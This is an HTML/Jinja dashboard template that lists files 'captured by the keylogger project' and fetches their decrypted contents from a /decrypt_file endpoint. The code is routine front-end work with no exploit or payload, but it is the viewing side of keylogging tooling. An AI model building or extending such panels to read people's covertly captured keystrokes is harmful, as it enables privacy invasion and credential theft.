<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: 'Roboto Mono', monospace; /* Use Roboto Mono font */
            background-image: url('/static/background2.jpg'); /* Background image */
            background-size: cover;
            background-position: center;
            color: #ffffff;
        }
        .container {
            padding: 20px;
        }
        .dashboard-header {
            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
            color: #ffffff;
            padding: 20px;
            text-align: center;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .dashboard-content {
            padding: 20px;
            text-align: center;
        }
        ul {
            list-style: none;
            padding: 0;
            margin: 0 auto;
            max-width: 300px;
        }
        li {
            width: 100%;
            height: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 1em auto;
            cursor: pointer;
            padding: 1em;
            position: relative;
            color: white;
            border-radius: 5px;
            background: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
            overflow: hidden;
            transition: background-color 0.4s; /* Changed transition to background-color */
        }
        li:hover {
            background-color: rgba(0, 128, 128, 0.7); /* Peacock green transparent background */
        }
        .file-info {
            margin-top: 5px;
            font-size: 14px;
            text-align: center;
        }
        .file-info span {
            display: block;
        }
        .file-name {
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="dashboard-header">
            <h2>Welcome to Your Dashboard</h2>
            <p>Viewing user data captured by the keylogger project</p>
        </div>
        <div class="dashboard-content">
            <h1>Captured Files</h1>
            <ul>
                {% for file in files %}
                <li onclick="decryptFile('{{ file[0] }}')">
                    <span class="file-name">{{ file[0] }}</span>
                    <div class="file-info">
                        <span>Date - {{ file[1] }}</span>
                        <span>Time - {{ file[2] }}</span>
                    </div>
                </li>
                {% endfor %}
            </ul>
        </div>
    </div>
    <script>
        function decryptFile(filename) {
            if (!filename) {
                console.error('Filename is empty');
                return;
            }
    
            fetch('/decrypt_file?filename=' + encodeURIComponent(filename))
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.text();
                })
                .then(data => {
                    alert(data);
                })
                .catch(error => {
                    console.error('Error decrypting file:', error);
                });
        }
    </script>
</body>
</html>
